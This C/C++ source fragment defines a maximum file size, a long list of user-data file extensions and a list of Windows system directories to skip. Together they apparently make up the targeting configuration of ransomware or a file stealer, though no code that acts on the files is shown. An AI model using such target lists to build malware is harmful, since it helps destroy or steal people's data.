#include <stdio.h>
#include <cmath>


#define MAX_FILE_SIZE int64_t(20 + 1e+6)

const char *extensions[] = {
    // Text Files
    "doc", "docx", "msg", "odt", "wpd", "wps", "txt",
    // Data files
    "csv", "pps", "ppt", "pptx",
    // Audio Files
    "aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
    // Video Files
    "3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
    // 3D Image files
    "3dm", "3ds", "max", "obj", "blend",
    // Raster Image Files
    "bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
    // Vector Image files
    "ai", "eps", "ps", "svg",
    // Page Layout Files
    "pdf", "indd", "pct", "epub",
    // Spreadsheet Files
    "xls", "xlr", "xlsx",
    // Database Files
    "accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
    // Game Files
    "dem", "gam", "nes", "rom", "sav",
    // Temp Files
    "bkp", "bak", "tmp",
    // Config files
    "cfg", "conf", "ini", "prf",
    // Source files
    "html", "php", "js", "c", "cc", "py", "lua", "go", "java"};

const char *skip_dir[] = {
    "ProgramData",
    "Windows",
    "bootmgr",
    "$WINDOWS.~BT",
    "Windows.old",
    "Temp",
    "tmp",
    "Program Files",
    "Program Files (x86)",
    "AppData",
    "$Recycle.Bin",
};